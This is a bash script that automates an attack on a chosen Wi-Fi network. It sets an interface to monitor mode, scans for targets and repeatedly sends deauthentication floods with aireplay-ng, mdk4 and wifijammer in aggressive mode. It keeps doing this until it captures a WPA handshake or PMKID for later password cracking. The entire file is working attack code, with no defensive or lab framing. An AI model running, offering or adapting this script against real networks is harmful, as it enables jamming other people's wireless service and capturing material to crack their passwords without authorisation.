#!/bin/bash

echo " "
echo "Opened new terminal !!!"
echo " "
echo "Copy chosen interface and save -> <iface>"
echo " "
echo "example -> wlan0"
echo " "
iw dev && sleep 2
echo " "
qterminal -e 'nano interface.txt'

#===========================================================================================================
echo " "
MODE1=$(iw dev | sed "/$(cat interface.txt)/,/type/!d;/type/!d;s/type//g;s/[ \t]//g")
if [ "$MODE1" = "monitor" ]; then
# "managed" value => yes ---
echo "interface Mode -> monitor !!! :-)"
echo " "
echo "continues attack process..."

else
echo "interface Mode -> "$(iw dev | sed "/$(cat interface.txt)/,/type/!d;/type/!d;s/type//g;s/[ \t]//g")" !!!"

#----------------------------------------------------------------------------------------------------
echo " "
read -p "Create a monitor mode with -> airmon or iw? (a/w) " RESP
if [ "$RESP" = "a" ]; then
echo " "
echo "Chosen -> airmon-ng !!!"
echo " "
echo "(yes) ---"

ifconfig "$(cat interface.txt)" down && airmon-ng check kill && airmon-ng start "$(cat interface.txt)"

# --- Critical value !!! -> Don't supported air monitor mode, use -> put the iw !!! ---
rm interface.txt
iw dev | sed '/Interface.*.mon/,/monitor/!d;/Interface/!d;s/Interface//g;s/[ \t]//g' > interface.txt
# --- ...or leave the process ---

else
echo " "
echo "Chosen -> iw (default)!!!"
echo " "
systemctl stop NetworkManager && systemctl stop wpa_supplicant && systemctl stop NetworkManager.service && systemctl stop wpa_supplicant.service && ip link set "$(cat interface.txt)" down && iw dev "$(cat interface.txt)" set monitor control && ip link set "$(cat interface.txt)" up
fi
#----------------------------------------------------------------------------------------------------

# --- just one interface... ---
# rm interface.txt
# iw dev | sed '/Interface/!d;s/Interface//g;s/[ \t]//g' > interface.txt

fi
#===========================================================================================================


airmon-ng check kill

# echo " "
echo "Opened new terminal again !!!"
echo " "
echo "stop scanning Press -> ctrl + c !!!"
echo " "
echo "Copy traget MAC and save -> <BSSID>"
echo " "
echo "example -> 1A:2B:3C:4D:5E:6F"
echo " "
sleep 6
airodump-ng -w /root/airlog --output-format csv,kismet "$(cat interface.txt)"
echo " "
qterminal -e 'nano macadress.txt'
echo " "
echo "Opened new terminal again !!!"
echo " "
echo "Write attack time -> <xy>m <xy>s or <xy>s/m"
echo " "
echo "example: nearby -> 1m, almost distant -> 10m, very distant -> 30m"
echo " " && sleep 2
qterminal -e 'nano attacktime.txt'
echo " "
mkdir "hands-$(sed 's/://g' macadress.txt)" || echo "(the folder already exists...)\n "

# grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | awk '{print $6}' | sed 's/,//g'
# grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d ',' -f 4 | sed 's/[ ]//g'
# grep "Client" hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt) | cut -d ',' -f 4 | perl -ne 'print if ++$k{$_}==1' | tail -1

# airmon-ng check kill

sleep 3

xterm -geometry '85x25+403+0' -e 'airodump-ng -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d") --bssid $(cat macadress.txt) -w hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt) $(cat interface.txt)' &

echo "aireplay attack ready after time -> $(cat attacktime.txt) !!!"
echo " "
xterm -geometry '65x25+0+0' -e 'sleep $(cat attacktime.txt) && aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-0[0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | tail -1) $(cat interface.txt)'

echo "again aireplay attack ready after time -> 10s, and check handshake !!!"
sleep 12
echo " "
# ***************** Check Handshake (1) *************************************************
CHECK1="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
# CHECK1="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"

if [ "$CHECK1" = "CATCH" ]; then
# CATCH value => yes ---
echo "Captured handshake !!! :-)"

echo " "
hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
echo " "
echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"

rm /root/airlog-*
kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
exit

else
echo "No catch handshake (ignored)"

fi
echo " "
echo "continues attack process..."
# ***************************************************************************************
xterm -geometry '65x25+0+0' -e 'aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-0[0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | tail -1) $(cat interface.txt)'
echo " "
echo "mdk4 attack ready after time -> 10s, and check handshake !!!"
sleep 12
echo " "
# ***************** Check Handshake (2) *************************************************
CHECK2="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
# CHECK2="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"

if [ "$CHECK2" = "CATCH" ]; then
# CATCH value => yes ---
echo "Captured handshake !!! :-)"

echo " "
hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
echo " "
echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"

rm /root/airlog-*
kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
exit

else
echo "No catch handshake (ignored)"

fi
echo " "
echo "continues attack process..."
# ***************************************************************************************
timeout 30s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
echo " "
echo "again mdk4 attack ready after time -> 10s, and check handshake !!!"
sleep 13
echo " "
# ***************** Check Handshake (3) *************************************************
CHECK3="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
# CHECK3="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"

if [ "$CHECK3" = "CATCH" ]; then
# CATCH value => yes ---
echo "Captured handshake !!! :-)"

echo " "
hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
echo " "
echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"

rm /root/airlog-*
kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
exit

else
echo "No catch handshake (ignored)"

fi
echo " "
echo "continues attack process..."
# ***************************************************************************************
timeout 30s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'

# ----------------FINAL ATTACK METHOD---REVERSE CLIENT SELECTION-->tail intead->head---------------------------------------
echo " "
echo "Last chance: FINAL ATTACK METHOD - REVERSE CLIENT SELECTION (tail intead -> head)"
echo " "

echo "aireplay attack ready after time -> 10s and check handshake !!!"
sleep 16
echo " "
# ***************** Check Handshake (4) *************************************************
CHECK4="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
# CHECK4="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"

if [ "$CHECK4" = "CATCH" ]; then
# CATCH value => yes ---
echo "Captured handshake !!! :-)"

echo " "
hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
echo " "
echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"

rm /root/airlog-*
kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
exit

else
echo "No catch handshake (ignored)"

fi
echo " "
echo "continues attack process..."
# ***************************************************************************************

xterm -geometry '65x25+0+0' -e 'aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-0[0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | head -1) $(cat interface.txt)'
echo " "
echo "again aireplay attack ready after time -> 10s, and check handshake !!!"
sleep 13
echo " "
# ***************** Check Handshake (5) *************************************************
CHECK5="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
# CHECK5="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"

if [ "$CHECK5" = "CATCH" ]; then
# CATCH value => yes ---
echo "Captured handshake !!! :-)"

echo " "
hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
echo " "
echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"

rm /root/airlog-*
kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
exit

else
echo "No catch handshake (ignored)"

fi
echo " "
echo "continues attack process..."
# ***************************************************************************************
xterm -geometry '65x25+0+0' -e 'aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-0[0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | head -1) $(cat interface.txt)'
echo " "
echo "mdk4 attack ready after time -> 10s, and check handshake !!!"
sleep 13
echo " "
# ***************** Check Handshake (6) *************************************************
CHECK6="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
# CHECK6="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"

if [ "$CHECK6" = "CATCH" ]; then
# CATCH value => yes ---
echo "Captured handshake !!! :-)"

echo " "
hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
echo " "
echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"

rm /root/airlog-*
kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
exit

else
echo "No catch handshake (ignored)"

fi
echo " "
echo "continues attack process..."
# ***************************************************************************************
timeout 30s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
echo " "
echo "again mdk4 attack ready after time -> 10s, and check handshake !!!"
sleep 15
echo " "
# ***************** Check Handshake (7) *************************************************
CHECK7="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
# CHECK7="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"

if [ "$CHECK7" = "CATCH" ]; then
# CATCH value => yes ---
echo "Captured handshake !!! :-)"

echo " "
hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
echo " "
echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"

rm /root/airlog-*
kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
exit

else
echo "No catch handshake (ignored)"

fi
echo " "
echo "continues attack process..."
# ***************************************************************************************
timeout 30s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
echo " "
echo "wifijammer attack ready after time -> 10s, and check handshake !!!"
sleep 15
echo " "
# ***************** Check Handshake (8) *************************************************
CHECK8="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
# CHECK8="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"

if [ "$CHECK8" = "CATCH" ]; then
# CATCH value => yes ---
echo "Captured handshake !!! :-)"

echo " "
hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
echo " "
echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"

rm /root/airlog-*
kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
exit

else
echo "No catch handshake (ignored)"

fi
echo " "
echo "continues attack process..."
# ***************************************************************************************

# --- FINAL wifijammer attack !!! ---
echo " "
echo "FINAL wifijammer attack !!!"
echo " "

timeout 30s xterm -geometry '65x25+0+0' -e 'python3 /root/wifijammer/wifijammer.py -a $(cat macadress.txt) -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d") -i $(cat interface.txt) --aggressive'

# Final sleep ---
echo "Final check handshake afer time -> 15s !!!"
sleep 15

# ***************** Check Handshake (9) *************************************************
CHECK9="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
# CHECK9="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"

if [ "$CHECK9" = "CATCH" ]; then
# CATCH value => yes ---
echo "Captured handshake !!! :-)"

echo " "
hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
echo " "
echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"

rm /root/airlog-*
kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
exit

else
echo "No catch handshake (ignored)"
echo " "
echo "Failure, impossible to catch yet... :-("
echo " "
echo "Exit the script !!!"
echo " "
rm /root/airlog-*
kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
exit

fi
# ***************************************************************************************
# echo " "
# rm /root/airlog-*
# kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
# exit
